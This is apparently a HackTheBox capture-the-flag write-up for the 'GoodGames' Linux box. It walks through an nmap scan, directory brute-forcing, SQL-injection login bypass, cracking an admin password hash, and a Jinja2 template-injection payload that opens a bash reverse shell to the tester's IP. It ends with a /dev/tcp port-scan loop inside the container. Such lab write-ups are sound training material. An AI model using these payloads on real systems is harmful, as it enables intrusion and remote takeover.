---
title: "HTB - GoodGames"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - GoodGames"
categories:
  - HTB
---

The given box ```GoodGames``` is a Linux machine 

- [HackTheBox- GoodGames](#hackthebox---GoodGames)
  
![[GoodGames.png]]

## Recon

### Nmap Scan

`nmap` found 1 open port on TCP.

```shell
┌──(root💀kali)-[~/HTB/LINUX/goodgames]
└─# cat goodgames.nmap 
# Nmap 7.92 scan initiated Mon Aug 29 00:08:26 2022 as: nmap -Pn -sC -sV -oN goodgames.nmap -v 10.10.11.130
Nmap scan report for 10.10.11.130
Host is up (0.73s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS POST
|_http-title: GoodGames | Community and Store
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 29 00:08:48 2022 -- 1 IP address (1 host up) scanned in 22.21 seconds
```

adding the hostname to the `/etc/hosts` file, `10.10.11.130 goodgames.htb`

## Enumeration

### Site

![[Pasted image 20220828221521.png]]

### Directory Bruteforcing

```shell
┌──(root💀kali)-[~/HTB/LINUX/goodgames]
└─# cat goodgames.directory 
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/79429cd6a70f439f93cc072980cdfbd9 (url length: 32)
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/405c619e4ba94edda067cee0d6f8c11135cb33401cb24be7bed708b7083954ac561dfdc602a24d0a90919ac9f0e96cd8 (url length: 96)
200      GET      267l      553w     9294c http://goodgames.htb/login
200      GET      267l      545w     9267c http://goodgames.htb/profile
200      GET     1735l     5548w    85107c http://goodgames.htb/
200      GET      909l     2572w    44212c http://goodgames.htb/blog
200      GET      728l     2070w    33387c http://goodgames.htb/signup
302      GET        4l       24w      208c http://goodgames.htb/logout => http://goodgames.htb/
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
200      GET      287l      620w    10524c http://goodgames.htb/coming-soon
```

### Creating Account

![[Pasted image 20220828222553.png]]

![[Pasted image 20220828222700.png]]

![[Pasted image 20220828222730.png]]

### Getting into admin 

`SQL Injection` login attack, payloads from `HackTricks`

![[Pasted image 20220828223420.png]]

![[Pasted image 20220828224125.png]]

![[Pasted image 20220828224604.png]]

![[Pasted image 20220828224739.png]]

![[Pasted image 20220828225010.png]]

### Crack Password

`2b22337f218b2d82dfc3b6f77e7cb8ec` -> superadministrator


![[Pasted image 20220828225745.png]]

### New host

http://internal-administration.goodgames.htb/index added to `/etc/hosts` file

![[Pasted image 20220828225837.png]]

![[Pasted image 20220828225854.png]]

In place fullname we are going to try SSTI exploits,

![[Pasted image 20220828230016.png]]

### Shell

`{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.2/9001  0>&1"').read() }}`

```shell
┌──(root💀kali)-[~/HTB/LINUX/goodgames]
└─# rlwrap nc -lvnp 9001                         
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.130] 58156
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
ls
ls
Dockerfile
project
requirements.txt
```

```shell
mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

```shell
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 68620  bytes 4064732 (3.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68839  bytes 6890172 (6.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 254  bytes 28392 (27.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 254  bytes 28392 (27.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```shell
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null 
<9.0.1/$port && echo "$port open"; done 2>/dev/null 
22 open
80 open
```

